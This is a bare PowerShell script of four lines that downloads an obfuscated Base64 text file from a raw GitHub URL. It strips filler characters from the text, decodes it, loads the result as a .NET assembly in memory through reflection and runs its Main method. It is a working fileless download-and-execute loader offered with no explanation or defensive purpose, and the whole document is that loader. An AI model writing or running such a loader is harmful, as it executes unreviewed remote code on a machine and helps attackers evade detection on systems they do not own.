Invoke-WebRequest -Uri "https://raw.githubusercontent.com/cparmn/Base64/master/Program.txt" -OutVariable $R  >$null
$Program_bytes = [System.Convert]::FromBase64String(($R.ToString() -replace '\?', '' -replace '\.', ''))
[Reflection.Assembly]::Load($Program_bytes) > $Null
[Program]::Main()